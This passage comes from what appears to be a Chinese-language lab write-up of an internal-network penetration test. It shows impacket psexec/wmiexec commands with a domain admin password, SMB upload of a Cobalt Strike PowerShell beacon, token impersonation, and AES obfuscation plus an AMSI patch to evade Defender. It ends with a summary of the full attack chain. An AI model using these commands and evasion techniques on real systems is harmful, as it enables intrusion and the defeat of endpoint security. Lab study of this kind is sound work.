proxychains python3 /usr/share/doc/python3-impacket/examples/psexec.py \
rootkit.org/administrator:'admin!@#45'@192.168.3.131
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_nitm.png)

权限略有不同，wmiexec 是 administrator，psexec 是 SYSTEM。

> **psexec 真实原理：**
>
> - 通过 SMB 上传一个 exe 到目标机器
> - 创建服务执行这个 exe
> - exe 执行完返回 shell
>
> 所以 psexec 确实会上传 exe，不是纯命令执行。
>
> **为什么 impacket 的 psexec 没被 Defender 拦？**
> 可能是这个版本的 Windows 10（10240）比较老，Defender 特征库不够新；也可能是 impacket 上传的 exe 特征码恰好不在库里。
>
> **wmiexec 才是真正无文件的：** 完全通过 WMI 接口执行命令，不上传任何文件，所以不会被 Defender 扫描到。
>
> **如果要用 CS 上线，思路就是：**
> `SMB/WMI协议 → 执行命令 → 下载/上传免杀payload → 执行免杀payload → 上线CS`

### 上传 PS1 后门

先在 CS 里生成一个正向监听器的 PS1 后门文件（beacon.ps1）：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_lzax.png)

**方法一：用 smbclient 直接上传**

```bash
proxychains smbclient //192.168.3.131/C$ \
-U 'rootkit.org/administrator%admin!@#45' \
-c "put /home/kali/beacon.ps1 beacon.ps1"
```

> - `smbclient`：Linux 下的 SMB 客户端工具
> - `//192.168.3.131/C$`：连接目标机器的 C 盘管理共享
> - `-U 'rootkit.org/administrator%admin!@#45'`：格式是 `域/用户名%密码`
> - `-c "put 本地路径 远程文件名"`：上传文件

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_hzzi.png)

文件刚上传上去就直接被检测杀了。

**方法二：通过 CS 的共享目录上传**

先用 CS 的 `upload` 命令把文件上传到 SRV-WEB-KIT：

```bash
upload D:\Backup\桌面\beacon.ps1
```

> 注意：不能上传到指定路径，用 `shell cd` 看当前路径，用 `shell dir C:\` 确认文件在 C 盘根目录。

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_6xtc.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_kq05.png)

然后用 `make_token` 伪造域管理员令牌，通过共享目录复制到 DF：

```bash
make_token ROOTKIT\Administrator admin!@#45
ls \\192.168.3.131\C$
# 或者
shell dir \\192.168.3.131\C$
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_3cdp.png)

> **make_token 原理：**
>
> Windows 里每个进程都有一个令牌（Token），代表当前用户的身份和权限。
> `make_token ROOTKIT\Administrator admin!@#45` 的意思是：用管理员账密创建一个新的访问令牌，之后所有网络请求都用这个令牌发出去，相当于冒充域管理员访问网络资源。
>
> 用完之后可以用 `rev2self` 恢复原来的身份。

通过共享目录上传文件

```bash
shell copy C:\beacon.ps1 \\192.168.3.131\C$\beacon.ps1
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_eh8g.png)

上传成功，但还是被检测扫了。

> **Windows 共享补充说明：**
>
> - **为什么能共享？** Windows 有 SMB 协议，C$  ,  ADMIN$ 是 Windows 自动创建的隐藏管理共享，只有管理员能访问。
> - **能做什么？**
>   - 查看文件 ✓ → `dir \\192.168.3.131\C$`
>   - 上传文件 ✓ → `copy 本地 \\192.168.3.131\C$\`
>   - 下载文件 ✓ → `copy \\192.168.3.131\C$\文件 本地`
>   - 删除文件 ✓ → `del \\192.168.3.131\C$\文件`
>   - **直接运行文件 ✗** → 不能，只是文件系统访问，需要用 wmiexec/psexec 触发执行
> - **获得域管理员权限**：
>   1. **伪造令牌（make_token）**：已经知道域管理员的账号密码，用make_token临时冒充域管理员身份，不需要真正登录，只是网络请求时用这个身份
>   2. **拿下DC**：直接在DC上执行命令，DC是域管理员权限，从DC上发出的操作天然就是最高权限

### AES 加密免杀

静态检测过不了，试试加密混淆。用 AES-Encoder 对 PS1 做加密：

项目地址：https://github.com/Chainski/AES-Encoder

```powershell
Import-Module .\AES-Encoder.ps1
Invoke-AES-Encoder -InFile .\beacon.ps1 -OutFile beacon_aes.ps1 -Iterations 3
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_weuw.png)

上传到 C 盘：

```bash
proxychains smbclient //192.168.3.131/C$ \
-U 'rootkit.org/administrator%admin!@#45' \
-c "put /home/kali/enc3_beacon.ps1 enc3_beacon.ps1"
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_f5mc.png)

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_s0g2.png)

3 次加密后，静态检测过了，Defender 没有报警。

### AMSI 绕过

但是运行的时候还是被检测到，不能正常上线：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_kp7s.png)

这是被 AMSI 检测了，静态过了但动态没过。

> **什么是 AMSI？**
>
> AMSI（Antimalware Scan Interface，反恶意软件扫描接口），是微软 Windows 10/11 和 Windows Server 2016+ 自带的安全机制。
>
> **AMSI 能检测什么？**
> - PowerShell 脚本中的恶意命令
> - 内存中的恶意代码（无文件攻击）
> - 混淆过的恶意脚本
> - 各种 payload（如 Mimikatz、CS 生成的 shellcode）
>
> 简单来说：静态检测是文件落地时扫的，AMSI 是**脚本运行时**动态扫的，所以加密过了文件扫不出来，但一运行脚本就被 AMSI 抓了。

经过多次尝试，发现利用项目里自带的 `amsi_patch.ps1` 可以绕过：

```powershell
# 通过内存补丁，让 AMSI 功能失效
$amsi = [Ref].Assembly.GetType(...)
# 修改 AMSI 的内存地址，使其无法工作
```

运行 `amsi_patch.ps1` 之后，AMSI 暂时失效，加密后门就能正常运行了。

**先用 wmiexec 拿到命令终端：**

```bash
proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py \
rootkit.org/administrator:'admin!@#45'@192.168.3.131
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_cjne.png)

**运行脚本：**

```powershell
powershell -ExecutionPolicy bypass -File amsi_enc6_beacon.ps1
```

> `-ExecutionPolicy Bypass` 是用来绕过 PowerShell 自身的执行策略限制的。不加这个参数的话，直接运行脚本会有权限提示，无法执行。

不加参数会检测，加了才能直接执行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_ywrh.png)

成功运行：

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_10yi.png)

验证监听端口是否开放：

```bash
netstat -ano | findstr 8896
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_5ojq.png)

因为是正向监听器，需要 cs 主动连过去：

```bash
connect 192.168.3.131 8896
```

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_meci.png)

DF 成功上线！

![](https://cdn.jsdelivr.net/gh/wr0ld/BlogImage@main/img/20260508_163232_1vba.png)

---

## 九、总结

这次打了一条比较完整的内网渗透链路，整体下来踩了不少坑，记录一下几个比较重要的点：

**整体攻击路径：**

```
外网 Kali
  → Redis 未授权 + SSH公钥写入
  → Web1（192.168.1.128，外网 Linux）
  → arp 缓存发现 + bash_history 找 SSH 命令
  → Web2（192.168.52.20，内网 Linux）
  → fscan 扫 93 网段
  → MSF 多层路由代理
  → OA 系统源码泄漏 → MSSQL sa 凭据
  → xp_cmdshell → CS 上线 SRV-WEB-KIT（192.168.93.128）
  → 提权 + 域内信息收集 + SPN 枚举
  → Exchange CVE-2020-0688 RCE
  → Mimikatz 抓域管密码
  → WMIEXEC + AES 加密 + AMSI 绕过
  → DF（192.168.3.131）上线
```

**几个踩坑记录：**

1. **Redis 公钥前后要加 `\n\n`**，不然 SSH 解析失败，这个细节容易忘。
2. **内网机器没有 nmap 时**，优先翻 `arp -a` 和 `~/.bash_history`，往往有意外收获。
3. **fscan 扫不到目标时**，可能是对方防火墙屏蔽了 ICMP（ping），加 `-t` 参数跳过 ICMP 直接扫端口 , 可能是自己靶机问题。
4. **Exchange CVE-2020-0688 很折腾**，exp 要选对，SSL 证书问题可以换火狐绕过，最后用 MSF 内置模块成功了, 其实还是环境问题。
5. **DF 有 Defender，直接上传 payload 必死**。思路是：先 AES 加密绕过静态检测，再用 amsi_patch.ps1 绕过 AMSI 的动态检测，然后才能正常上线。
6. **正向 vs 反向监听器**：内网机器有防火墙或者回连路径复杂时，正向监听（bind_tcp）往往更简单，由 Kali 主动去连。
